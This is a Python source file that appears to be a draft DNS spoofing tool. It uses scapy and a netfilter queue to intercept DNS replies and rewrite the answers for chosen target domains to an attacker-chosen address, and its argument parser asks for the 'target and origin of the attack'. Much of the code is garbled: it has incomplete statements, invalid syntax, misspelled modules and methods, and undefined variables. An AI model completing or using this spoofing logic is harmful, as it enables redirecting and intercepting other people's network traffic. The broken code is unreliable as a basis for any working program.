#
from pandas import DataFrame, MultiIndex 
import threading
import netfilterqueqe
import sys 
import sqlite3 
import logging
import functools
import scapy.all as cap
import socketserver as ss
import asyncio as sync 
import argparse
import string


logging.basicConfig(
    level=logging.DEBUG,
    format='(%(Appname)s %(threadName)-10s) %(message)s',
    filename="sycllapp.log"
);

e = threading.Event();

q = netfilterqueqe.NetfilterQueqe()

server_local_address = ()

string_list_of_internet_services = [ ]

map_of_known_hosts_db = 

class Index():
    def __init__(self,*args):
        self.index = pd.MultiIndex.from_product([[string_list_of_internet_services.filter()],
        [args.get['host_ipv4_address'],args.get['host_ipv6_address'], args.get['domain_name']]], 
        names = ['port services', 'hostname']) 
        self.data = [ ]
        self.DataFrame = ( self.data , index=self.index, columns=[])


class Intel():
    def __init__(self):
        super()__new__(self):
            self.target_host_data = []
            self.packet_origin_address = []
            return Index()


intel = Intel()

def user_input_target(self, *args):
   target = 
    if args.get == ['target*']:
            target.append(args.get['target']) 
        return destination
    else:
        return 0 
    ...

def user_input_origin( *args):
    origin = 
    if args.get == ['origin*']: 
    ...

target_by_user = user_input_target
origin_by_user = user_input_origin
parser = argparse.ArgumentParser(
    description=' Enter the target and origin of the attack',
)

def scan_prompt_data(self) -> :
    print('set arguemnets: ', sys.argv)
    if self.prompt_data is not None: 
        sys.stdout.write()



def discover_host(*args):
    while args.get == ['target*'] 
        cap.conf.
        ...

def establish_link_with_target(target):
    ...


 def spoof(packet):
    packet = cap.IP(packet.get_payload())
    while packet.haslayer(cap.DNSRR):
        qname = packet[cap.DNSQR].qname 
        for i in target_by_user:
            if target_by_user in qname: 
                payload = cap.DNSRR(rrname=qname, rdata=origin_by_user)
                packet[cap.DNS].an = payload 
                packet[cap.DNS].ancount = 1
                del packet[cap.IP].len
                del packet[cap.IP].chksum
                del packet[cap.UDP].chksum
                del packet[cap.UDP].chksum
                del packet[cap.UDP].len 

            packet.set_payload(str(cap_packet))
    packet.accept()

e= threading.Event()

scan_input_thread = threading.Thread(
    name=' scanning user input %()s'
    target = scan_prompt_data,
    args=(e,)
)

process_spoof_thread = threading.Thread(
    name=' packet processing %()s'
    target= process,
    args=(e,),
)
process = ( spoof, establish_link_with_target,  )
def main():
  parser.add_arguemnt('end', action=, default=False);
  parser.add_arguemnt('start', action=, default=True);
  parser.addd_arguement('get', action=, default=False);
  parser.add_arguemnt('--spoof',action=,default=False);
  parser.add_arguement('--connect',action=,default=False);
  while :
    if :
        queue = q.bind(0, )
    elif :
    
    elif :

if __name__ is __main__:
    main()